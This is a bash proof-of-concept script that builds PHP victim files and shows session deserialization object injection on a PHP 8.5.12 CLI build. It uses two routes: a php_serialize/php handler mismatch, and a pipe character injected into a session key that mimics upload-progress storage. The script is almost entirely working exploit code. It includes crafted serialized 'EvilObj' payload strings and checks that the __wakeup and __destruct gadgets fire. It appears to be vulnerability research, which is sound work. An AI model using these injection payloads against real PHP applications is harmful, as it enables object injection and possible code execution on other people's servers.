#!/bin/bash
# =============================================================================
# STAGE A1+A2 - serialize_handler mismatch + pure-'php' pipe-key injection
# on PHP 8.5.12 CLI (plain2 build). No Apache needed. All receipts to stdout.
# =============================================================================
PHP8512=/tmp/php8512_build/plain2/sapi/cli/php
ROOT=/tmp/p2s_mm
SID=claudiusa1sid00000000000000
rm -rf $ROOT; mkdir -p $ROOT

# --------------------------------------------------------------- victim code
# WRITE path: app route that stores attacker-controlled STRING into the session
# while running with handler=php_serialize (ini_set = "app config" scenario;
# same effect via php_value/.htaccess).
cat > $ROOT/writer.php <<'EOF'
<?php
ini_set('session.use_strict_mode', '0');
ini_set('session.serialize_handler', 'php_serialize');
session_id('claudiusa1sid00000000000000');
session_start();
// attacker string (from POST/JSON anywhere the app persists raw user input)
$_SESSION['userpref'] = 'inj|O:7:"EvilObj":2:{s:3:"cmd";s:4:"id -";s:4:"note";s:5:"pwned";}';
session_write_close();
echo "[writer] handler=" . ini_get('session.serialize_handler') . " wrote session\n";
EOF

# READ path: main app, default handler = php, and app defines classes (the
# POP gadget pool every real app has).
cat > $ROOT/reader.php <<'EOF'
<?php
class EvilObj {
    public $cmd; public $note;
    public function __wakeup()  { file_put_contents('/tmp/p2s_mm/WAKEUP_FIRED.txt', "wakeup fired cmd=" . $this->cmd . "\n"); }
    public function __destruct(){ file_put_contents('/tmp/p2s_mm/DESTRUCT_FIRED.txt', "destruct fired cmd=" . $this->cmd . "\n"); }
}
ini_set('session.use_strict_mode', '0');
ini_set('session.serialize_handler', 'php');
session_id('claudiusa1sid00000000000000');
session_start();
echo "[reader] handler=" . ini_get('session.serialize_handler') . "\n";
$k = array_key_first($_SESSION);
$v = $_SESSION[$k];
echo "[reader] first session key: " . var_export($k, true) . "\n";
echo "[reader] first session value class: " . get_class($v) . "\n";
echo "[reader] injected properties: cmd=" . var_export($v->cmd, true) . " note=" . var_export($v->note, true) . "\n";
echo "[reader] var_dump:\n";
var_dump($_SESSION);
EOF

# weak variant: BOTH sides 'php' handler, but the WRITE side puts an
# attacker-controlled pipe into a session KEY (exactly what the upload-progress
# hook produces). No mismatch needed at all.
cat > $ROOT/writer2.php <<'EOF'
<?php
ini_set('session.use_strict_mode', '0');
ini_set('session.serialize_handler', 'php');
session_id('claudiusa2sid00000000000000');
session_start();
// this is byte-identical to what php_session_rfc1867_callback stores when the
// multipart field PHP_SESSION_UPLOAD_PROGRESS has value:
//   inj|O:7:"EvilObj":2:{...}
$_SESSION['upload_progress_inj|O:7:"EvilObj":2:{s:3:"cmd";s:4:"id -";s:4:"note";s:5:"pwned";}'] =
    array('start_time'=>123, 'content_length'=>456, 'bytes_processed'=>0, 'done'=>false, 'files'=>array());
session_write_close();
echo "[writer2] handler=" . ini_get('session.serialize_handler') . " wrote pipe-key session\n";
EOF
cat > $ROOT/reader2.php <<'EOF'
<?php
class EvilObj {
    public $cmd; public $note;
    public function __wakeup()  { file_put_contents('/tmp/p2s_mm/WAKEUP2_FIRED.txt', "wakeup fired\n"); }
    public function __destruct(){ file_put_contents('/tmp/p2s_mm/DESTRUCT2_FIRED.txt', "destruct fired\n"); }
}
ini_set('session.use_strict_mode', '0');
ini_set('session.serialize_handler', 'php');
session_id('claudiusa2sid00000000000000');
session_start();
echo "[reader2] handler=" . ini_get('session.serialize_handler') . "\n";
echo "[reader2] session keys: "; echo implode(", ", array_keys($_SESSION)); echo "\n";
foreach ($_SESSION as $k => $v) { echo "[reader2] key=" . var_export($k, true) . " -> " . gettype($v); if (is_object($v)) echo " (" . get_class($v) . ")"; echo "\n"; }
echo "[reader2] var_dump:\n";
var_dump($_SESSION);
EOF

echo "=================================================================="
echo " A1: serialize_handler mismatch  (write=php_serialize, read=php)"
echo " build: $($PHP8512 -r 'echo PHP_VERSION;') cli"
echo "=================================================================="
$PHP8512 -d session.save_path=$ROOT $ROOT/writer.php
echo "--- session file on disk (hexdump -C first 400 bytes) ---"
hexdump -C $ROOT/sess_$SID | head -12
echo "--- READ request (default php handler) ---"
$PHP8512 -d session.save_path=$ROOT $ROOT/reader.php
echo "--- POP markers after reader ran ---"
for f in WAKEUP_FIRED.txt DESTRUCT_FIRED.txt; do
  if [ -f $ROOT/$f ]; then echo "[PASS] $f exists: $(cat $ROOT/$f)"; else echo "[FAIL] $f missing"; fi
done

echo ""
echo "=================================================================="
echo " A2: NO mismatch - pure 'php' handler both sides, pipe in session KEY"
echo "     (byte-equal to upload-progress hook storage format)"
echo "=================================================================="
$PHP8512 -d session.save_path=$ROOT $ROOT/writer2.php
echo "--- session file on disk (hexdump -C first 400 bytes) ---"
hexdump -C $ROOT/sess_claudiusa2sid00000000000000 | head -12
echo "--- READ request (same php handler) ---"
$PHP8512 -d session.save_path=$ROOT $ROOT/reader2.php
echo "--- POP markers after reader2 ran ---"
for f in WAKEUP2_FIRED.txt DESTRUCT2_FIRED.txt; do
  if [ -f $ROOT/$f ]; then echo "[PASS] $f exists: $(cat $ROOT/$f)"; else echo "[FAIL] $f missing"; fi
done
echo "=================================================================="
echo " done; artifacts in $ROOT"
echo "=================================================================="
